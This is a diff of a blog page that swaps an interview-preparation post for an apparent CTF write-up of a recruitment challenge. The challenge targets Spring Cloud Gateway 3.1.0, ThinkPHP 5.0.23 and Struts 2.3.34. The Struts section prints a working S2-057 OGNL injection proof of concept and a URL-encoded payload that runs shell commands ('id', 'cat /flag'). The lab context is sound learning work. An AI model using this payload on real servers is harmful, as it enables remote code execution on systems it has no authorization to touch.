@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="记录学成在线项目的面试板块">
-<title>学成在线-面试</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="记录wp">
+<title>御林招新题：档案馆的回响</title>
 
-<link rel='canonical' href='https://example.com/posts/%E5%AD%A6%E6%88%90%E5%9C%A8%E7%BA%BF/'>
+<link rel='canonical' href='https://example.com/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/'>
 
-<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="学成在线-面试">
-<meta property='og:description' content="记录学成在线项目的面试板块">
-<meta property='og:url' content='https://example.com/posts/%E5%AD%A6%E6%88%90%E5%9C%A8%E7%BA%BF/'>
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="御林招新题：档案馆的回响">
+<meta property='og:description' content="记录wp">
+<meta property='og:url' content='https://example.com/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/'>
 <meta property='og:site_name' content='Calendar&#39;s Blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='技术' /><meta property='article:published_time' content='2025-10-05T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-05T00:00:00&#43;00:00'/>
-<meta name="twitter:title" content="学成在线-面试">
-<meta name="twitter:description" content="记录学成在线项目的面试板块">
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-10-14T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-14T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="御林招新题：档案馆的回响">
+<meta name="twitter:description" content="记录wp">
     </head>
     <body class="
     article-page
@@ -206,8 +206,14 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#项目介绍">项目介绍</a></li>
-    <li><a href="#技术架构">技术架构</a></li>
+    <li><a href="#题干">题干</a></li>
+    <li><a href="#解题过程">解题过程</a>
+      <ol>
+        <li><a href="#spring-cloud-gateway-310">Spring Cloud Gateway 3.1.0</a></li>
+        <li><a href="#thinkphp-5023">ThinkPHP 5.0.23</a></li>
+        <li><a href="#struts-2334">Struts 2.3.34</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -226,8 +232,8 @@
     
     <header class="article-category">
         
-            <a href="/categories/%E5%BC%80%E5%8F%91/" style="background-color: #80aba9; color: #fff;">
-                开发
+            <a href="/categories/ctf/" >
+                CTF
             </a>
         
     </header>
@@ -235,9 +241,13 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/posts/%E5%AD%A6%E6%88%90%E5%9C%A8%E7%BA%BF/">学成在线-面试</a>
+            <a href="/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/">御林招新题：档案馆的回响</a>
         </h2>
     
+        
+        <h3 class="article-subtitle">
+            记录wp
+        </h3>
         
     </div>
 
@@ -257,7 +267,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Oct 05, 2025</time>
+                <time class="article-time--published">Oct 14, 2025</time>
             </div>
         
 
@@ -273,72 +283,109 @@
     <section class="article-content">
     
     
-    <h2 id="项目介绍">项目介绍
-</h2><p>从以下几个方面进行项目介绍：</p>
-<ol>
+    <h2 id="题干">题干
+</h2><ul>
 <li>
-<p>项目的背景，包括：是自研还是外包，什么业务，服务的客户群是谁，谁去运营等问题。</p>
+<p><strong>目标一</strong>：云端之门的低语 （ Spring Cloud Gateway 3.1.0）</p>
+<p>“天穹”微服务 API 网关：这是公司最新潮的 API 网关，所有数据的流量中枢，看起来坚不可摧。然而，根据情报，这个版本的网关在处理路由请求时，似乎留下了一道不易察觉的缝隙。</p>
 </li>
 <li>
-<p>项目的业务流程（核心的业务流程）</p>
+<p><strong>目标二</strong>：思想者的诡计 （ThinkPHP 5.0.23）</p>
+<p>“敏捷开发” PHP 门户:这是用一款广受欢迎的 PHP 框架搭建的门户网站，以其高效和灵活著称。然而，在处理 HTTP 请求的某个环节，框架对“请求方法”的理解出现了偏差。</p>
 </li>
 <li>
-<p>项目的功能模块（核心模块一定要说）</p>
+<p><strong>目标三</strong>：远古框架的咆哮 （ Struts 2.3.34）</p>
+<p>“化石”级企业管理平台：这是一个老旧的 Java 企业级应用，虽然年迈，但依然在核心业务线上运行。它的开发者在配置某个核心组件时，遵循了当时流行的“通配符”设计哲学，却忽略了这份“灵活”背后潜藏的巨大风险。</p>
 </li>
-<li>
-<p>项目的技术架构</p>
-</li>
-<li>
-<p>个人工作职责（说得详细一些）</p>
-</li>
-<li>
-<p>个人负责模块的详细说明，包括模块设计，用到的技术，技术的实现方案等（找最熟悉的模块进行说明）。</p>
-</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">项目基本介绍：是公司自研的专门针对成人职业技能教育的网络课堂系统，网站提供了成人职业技能培训的相关课程，如：软件开发培训。基于B2B2C的业务模式。培训机构可以在平台入驻、发布课程，我们公司作为运营方由专门的人员对发布的课程进行审核，审核通过后课程才可以发布成功，课程包括免费和收费两种形式，对于免费课程用户可以直接选课学习，对于收费课程要在选课后支付成功才可以继续学习。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">本项目包括3个端：用户端、机构端、运营端。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">核心模块：内容管理、媒资管理、课程搜索、订单支付、选课管理、认证授权等。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">本项目采用前后端分离架构，后端采用SpringBoot、SpringCloud技术栈开发，数据库使用了Mysql，还使用了Redis、消息队列、分布式文件系统、Elasticsearch等中间件系统（要清楚这些中间件在系统中是如何使用的，在哪里使用的）。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">划分的微服务包括：内容管理服务、媒资管理服务、搜索服务、订单支付服务、学习中心服务、系统管理服务、认证授权服务、网关服务、注册中心服务、配置中心服务等。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">我在这个项目中负责了内容管理、媒资管理、订单支付模块的设计与开发。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">个人负责模块的详细说明：内容管理模块，是对平台上的课程进行管理。设计了课程基本信息表、课程营销表、课程计划、课程师资表。培训机构要发布一门课程需要填写课程基本信息、课程营销信息、课程计划信息、课程师资信息，填写完毕后要提交审核，由运营人员进行课程信息的审核，整个审核过程是程序自动审核加入人工确认的方式，通常24小时完成审核。课程审核通过即可发布课程，课程的相关信息会聚合到课程发布表中，这里不仅要将课程信息写到课程发布表还要将课程信息写到索引库、分布式文件系统中，所以这里存在分布式事务的问题，项目使用本地消息表加任务调度的方式去解决这里的分布式事务，保证数据的最终一致性。
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="技术架构">技术架构
-</h2><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251005095900249.png"
+</ul>
+<h2 id="解题过程">解题过程
+</h2><h3 id="spring-cloud-gateway-310">Spring Cloud Gateway 3.1.0
+</h3><p>直接脚本过了</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251014133624235.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20251005095900249"
+		alt="image-20251014133624235"
 	
 	
 ></p>
-
+<h3 id="thinkphp-5023">ThinkPHP 5.0.23
+</h3><p>也是脚本</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251014133714323.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251014133714323"
+	
+	
+></p>
+<h3 id="struts-2334">Struts 2.3.34
+</h3><p>这个脚本不知道怎么用</p>
+<p>于是尝试解题：</p>
+<ol>
+<li>打开网站发现是空白的，扫描工具扫到 <code>/upload.action</code>，进入</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251014133909616.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251014133909616"
+	
+	
+></p>
+<ol start="2">
+<li>是 struts2，网上查询，发现 <code>S2-057远程执行代码漏洞（CVE-2018-11776）</code> 影响当前版本</li>
+</ol>
+<blockquote>
+<p>参考 <a class="link" href="https://blog.csdn.net/weixin_59872639/article/details/123206712"  target="_blank" rel="noopener"
+    >Struts2 S2-057远程执行代码漏洞（CVE-2018-11776）_apache struts 2 安全漏洞(cve-2018-11776)-CSDN博客</a></p>
+<p>区别在于上面靶场的网址是 /showcase</p></blockquote>
+<ol start="3">
+<li>漏洞判断</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251014182607127.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251014182607127"
+	
+	
+></p>
+<ol start="4">
+<li>poc</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${
+</span></span><span class="line"><span class="cl">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>注意：poc 放到网址上，需要 url 编码。后续又发现，“ls /”这一字符串中空格需要编码，但是斜杠不需要编码！<code>..</code>也不需要编码</p></blockquote>
+<ol start="5">
+<li>最终 payload：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span><span class="err">：</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">action</span><span class="o">/$%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">dm</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="err">@</span><span class="n">ognl</span><span class="o">.</span><span class="n">OgnlContext</span><span class="err">@</span><span class="n">DEFAULT_MEMBER_ACCESS</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ct</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">23</span><span class="n">request</span><span class="o">%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">27</span><span class="n">struts</span><span class="o">.</span><span class="n">valueStack</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">.</span><span class="n">context</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">cr</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">23</span><span class="n">ct</span><span class="o">%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">27</span><span class="n">com</span><span class="o">.</span><span class="n">opensymphony</span><span class="o">.</span><span class="n">xwork2</span><span class="o">.</span><span class="n">ActionContext</span><span class="o">.</span><span class="n">container</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ou</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">23</span><span class="n">cr</span><span class="o">.</span><span class="n">getInstance</span><span class="o">%</span><span class="mi">28</span><span class="err">@</span><span class="n">com</span><span class="o">.</span><span class="n">opensymphony</span><span class="o">.</span><span class="n">xwork2</span><span class="o">.</span><span class="n">ognl</span><span class="o">.</span><span class="n">OgnlUtil</span><span class="err">@</span><span class="k">class</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ou</span><span class="o">.</span><span class="n">getExcludedPackageNames</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mf">29.</span><span class="n">clear</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ou</span><span class="o">.</span><span class="n">getExcludedClasses</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mf">29.</span><span class="n">clear</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ct</span><span class="o">.</span><span class="n">setMemberAccess</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">dm</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">a</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="err">@</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="err">@</span><span class="n">getRuntime</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mf">29.</span><span class="n">exec</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">27</span><span class="n">cat</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">flag</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="err">@</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">commons</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">IOUtils</span><span class="err">@</span><span class="n">toString</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">a</span><span class="o">.</span><span class="n">getInputStream</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">/</span><span class="n">actionChain1</span><span class="o">.</span><span class="n">action</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
@@ -346,7 +393,7 @@
     
     <section class="article-tags">
         
-            <a href="/tags/%E6%8A%80%E6%9C%AF/">技术</a>
+            <a href="/tags/ctf/">CTF</a>
         
     </section>
 
@@ -379,38 +426,13 @@
         <div class="flex article-list--tile">
             
                 
-<article class="has-image">
-    <a href="/posts/mybatis/">
+<article class="">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-ipv4/">
         
-        
-            <div class="article-image">
-                
-                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251012201626030.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251012201626030.png"/>
-                
-            </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">Mybatis</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/posts/springboot%E5%AE%9E%E7%94%A8%E6%95%99%E7%A8%8B/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251012171949620.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251012171949620.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">SpringBoot</h2>
+            <h2 class="article-title">御林招新题：ipv4</h2>
         </div>
     </a>
 </article>
@@ -418,38 +440,12 @@
             
                 
 <article class="">
-    <a href="/posts/springmvc/">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-%E5%BE%A1%E5%9B%BE%E7%BD%91/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">SpringMVC</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/posts/spring/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Spring</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/posts/javaweb-servlet/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">JavaWeb-Servlet</h2>
+            <h2 class="article-title">御林招新题：御图网</h2>
         </div>
     </a>
 </article>
